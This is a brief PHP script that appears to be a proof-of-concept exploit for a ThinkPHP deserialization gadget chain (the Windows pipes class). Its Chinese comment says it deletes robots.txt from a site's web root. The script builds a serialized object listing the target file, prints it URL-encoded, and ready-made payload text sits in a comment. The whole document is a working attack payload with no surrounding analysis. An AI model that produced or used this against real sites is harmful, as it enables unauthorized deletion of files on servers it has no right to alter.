<?php 
 
/*删除网站根目录的robots.txt*/
/*payload: O%3A27%3A%22think%5Cprocess%5Cpipes%5CWindows%22%3A1%3A%7Bs%3A34%3A%22%00think%5Cprocess%5Cpipes%5CWindows%00files%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A10%3A%22robots.txt%22%3B%7D%7D*/

namespace think\process\pipes;

abstract class Pipes
{

}


class Windows extends Pipes
{
	private $files = [];
	function __construct()
	{
		$this->files = ["robots.txt"]; 
	}

}


$a=new Windows();
echo urlencode(serialize($a));

?>
